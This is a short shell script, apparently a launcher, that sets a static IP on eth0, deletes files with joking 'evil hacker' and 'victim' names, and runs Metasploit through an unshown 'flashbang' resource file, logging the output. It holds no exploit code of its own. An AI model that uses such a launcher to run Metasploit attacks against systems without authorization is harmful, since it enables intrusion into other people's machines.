#!/bin/sh
ifconfig eth0 192.168.1.42/24 up
rm -f super_secret_evil_hacker_file.txt picture_of_a_victim.jpg voice_of_a_victim.wav

if [ "${1}" = "--elite" ]
then
	sudo msfconsole -r flashbang_elite.rc | tee super_secret_evil_hacker_file.txt
else
	sudo msfconsole -r flashbang.rc | tee super_secret_evil_hacker_file.txt
fi
